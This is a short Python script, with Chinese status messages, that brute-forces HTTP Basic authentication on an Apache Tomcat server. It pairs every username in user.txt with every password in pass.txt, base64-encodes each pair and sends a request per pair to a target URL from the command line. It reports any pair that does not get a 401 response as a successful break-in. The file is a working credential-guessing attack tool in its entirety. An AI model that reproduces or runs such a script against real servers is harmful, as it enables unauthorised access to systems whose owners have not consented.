#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests
import base64
import sys


password_base64 = []


def get_cheek_pass():
    with open("user.txt", "r") as f:
        for name in f:
            #print(name.strip())
            with open("pass.txt","r",encoding='ISO-8859-1') as f:
                for password in f:
                    #print(password.strip())
                    pass_str = name.strip()+":"+password.strip()
                    #print(pass_str)
                    base64_str = base64.b64encode(pass_str.encode('utf-8')).decode("utf-8")
                    #print(base64_str)
                    password_base64.append(base64_str)
                    

def cheek_tomcat(url):
    i = 0
    print("[+] startig tomcat cheek --- ---\n")
    con = int(len(password_base64))
    for basic in password_base64:
        i = i + 1
        print("[+] 正在进行第 {} 组密码暴破## 已完成: {:.2f}%".format(i,i/con),end="\r")
        #print(basic)
        headers = {
        "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
        "Content-Type":"application/x-www-form-urlencoded",
        'Authorization': 'Basic %s' % basic
        }
        try:
            req = requests.get(url, headers=headers, timeout=5)
            if req.status_code != 401:
                print("[+] status_code:",req.status_code, "tomcat爆破成功:",base64.b64decode(basic.encode("utf-8")).decode("utf-8"))
            else:
                pass
        except Exception as e:
            print(e)




if __name__ == "__main__":
    get_cheek_pass()
    url = sys.argv[1]
    cheek_tomcat(url)
    